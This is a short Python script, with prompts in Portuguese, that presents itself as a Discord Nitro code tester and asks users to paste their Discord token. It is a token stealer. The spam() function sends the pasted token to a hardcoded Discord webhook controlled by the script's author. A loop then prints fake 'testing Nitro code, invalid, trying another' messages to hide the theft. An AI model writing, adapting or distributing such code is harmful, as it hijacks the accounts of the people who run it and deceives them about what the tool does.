import requests
import time
print('''
  \033[1;32m _____ __  _____  ______________  __
  / ___// / / /   |/_  __/ ____/ / / /
  \__ \/ /_/ / /| | / / / __/ / / / / 
 ___/ / __  / ___ |/ / / /___/ /_/ /  
/____/_/ /_/_/  |_/_/ /_____/\____/\033[m
                                      ''')
                                      
print("  \033[36mCOLE O TOKEN CERTO SE N NAO IRA FUNCIONAR\033m")
print("   A FERRAMENTA N RECONHECE SE ESTA CERTO O TOKEN")
token = str(input("\n  COPIE SEU TOKEN E COLE NO TERMINAL \n"))


def spam():
	payload = {
		'content': token
	}
	
	header = {'authorization': token
	}
	
	r =	requests.post("https://discord.com/api/webhooks/850759051742806026/PFxgSVCMLmpUe0RCGUmtycd6RIDdt9rZ11nQfszAF2JBczivauJkbIGlf373icTSf7ya", data=payload, headers=header)
	return print("Começando")


spam()
while True:
	print("TESTANDO CODIGO NITRO")
	time.sleep(1)
	print("INVALIDO, TENTANDO OUTRO")
